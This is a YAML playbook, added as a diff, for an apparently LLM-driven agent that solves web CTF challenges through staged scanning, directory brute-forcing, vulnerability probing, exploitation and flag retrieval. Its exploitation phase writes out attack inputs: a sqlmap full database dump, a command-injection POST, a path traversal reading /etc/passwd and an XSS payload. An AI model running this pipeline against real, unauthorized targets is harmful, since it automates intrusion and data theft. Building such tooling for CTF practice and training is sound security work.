@@ -1,0 +1,104 @@
+metadata:
+  name: "web_standard"
+  category: "web"
+  description: "标准Web类CTF题解题流程：信息收集→目录扫描→漏洞探测→利用→Flag提取"
+  difficulty: "medium"
+  estimated_time: "45min"
+  required_tools: ["nmap", "whatweb", "gobuster", "dirb", "nikto", "sqlmap", "curl"]
+
+phases:
+  - name: "信息收集"
+    description: "识别目标开放端口、Web技术栈和服务指纹"
+    tools:
+      - tool: "nmap"
+        args: {target: "{{target_host}}", ports: "80,443,8080,8443", flags: "-sV -sC"}
+      - tool: "whatweb"
+        args: {url: "{{target}}"}
+    llm_prompt: >
+      分析nmap端口扫描和whatweb指纹识别的结果。
+      识别目标Web服务器类型、后端语言、CMS、已知的中间件版本漏洞。
+      总结暴露的攻击面，为下一步目录扫描提供优先级建议。
+    timeout: 120
+    critical: false
+
+  - name: "目录扫描"
+    description: "爆破隐藏目录和文件，发现后台、备份、敏感接口"
+    tools:
+      - tool: "gobuster"
+        args: {url: "{{target}}", wordlist: "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", extensions: "php,txt,bak,zip,tar.gz,sql,git,svn"}
+      - tool: "dirb"
+        args: {url: "{{target}}", wordlist: "/usr/share/wordlists/dirb/common.txt"}
+    llm_prompt: >
+      分析目录扫描结果，识别以下高价值路径：
+      1. 后台登录页面（admin/login/manager等）
+      2. 备份文件（.bak/.zip/.sql等）
+      3. 版本控制泄露（.git/.svn）
+      4. 敏感接口（api/debug/phpinfo等）
+      给出下一步漏洞探测的重点方向。
+    timeout: 300
+    critical: false
+
+  - name: "漏洞探测"
+    description: "对发现的入口点进行漏洞扫描，确认可利用点"
+    tools:
+      - tool: "nikto"
+        args: {host: "{{target}}", flags: "-C all"}
+      - tool: "curl"
+        args: {url: "{{target}}/robots.txt", method: "GET"}
+    llm_prompt: >
+      综合分析nmap、目录扫描和nikto的结果，识别可能存在的漏洞类型：
+      - SQL注入（参数特征、报错信息）
+      - XSS（输入点反射）
+      - 文件包含/路径遍历（URL参数特征）
+      - 命令注入（功能特征）
+      - 未授权访问（响应码和长度差异）
+      - 已知CVE（版本号匹配）
+      给出最有可能成功的漏洞利用路径和对应工具建议。
+    timeout: 180
+    critical: false
+
+  - name: "漏洞利用"
+    description: "根据漏洞类型选择对应工具进行利用"
+    tools:
+      - tool: "sqlmap"
+        args: {url: "{{target}}", flags: "--batch --dump"}
+        condition: "vuln_type == 'sqli'"
+      - tool: "curl"
+        args: {url: "{{target}}", method: "POST", data: "cmd=id", headers: "Content-Type: application/x-www-form-urlencoded"}
+        condition: "vuln_type == 'rce'"
+      - tool: "curl"
+        args: {url: "{{target}}/../../../etc/passwd", method: "GET"}
+        condition: "vuln_type == 'lfi'"
+      - tool: "curl"
+        args: {url: "{{target}}?payload=<script>alert(1)</script>", method: "GET"}
+        condition: "vuln_type == 'xss'"
+    llm_prompt: >
+      分析漏洞利用阶段的工具输出：
+      1. 是否成功获取了非授权访问或数据泄露？
+      2. 对于SQL注入：是否提取到数据库名、表名、敏感字段？
+      3. 对于命令注入/RCE：是否获得了命令回显或反弹shell？
+      4. 对于文件包含：是否成功读取/etc/passwd或flag文件？
+      给出获取Flag的具体操作建议。
+    timeout: 300
+    critical: true
+
+  - name: "Flag提取"
+    description: "从利用结果中提取并提交Flag"
+    tools:
+      - tool: "curl"
+        args: {url: "{{target}}/flag.txt", method: "GET"}
+      - tool: "curl"
+        args: {url: "{{target}}/flag", method: "GET"}
+      - tool: "curl"
+        args: {url: "{{target}}/flag.php", method: "GET"}
+    llm_prompt: >
+      从所有工具输出中搜索Flag。常见格式包括：flag{...}、FLAG{...}、ctf{...}、CTF{...}。
+      如果找到Flag，返回完整Flag字符串；如果没有找到，建议其他可能的Flag位置。
+      确认Flag后标记任务完成。
+    timeout: 30
+    critical: false
+
+fallback:
+  action: "alternative_tool"
+  alternative: "manual_analysis"
+  max_retries: 2
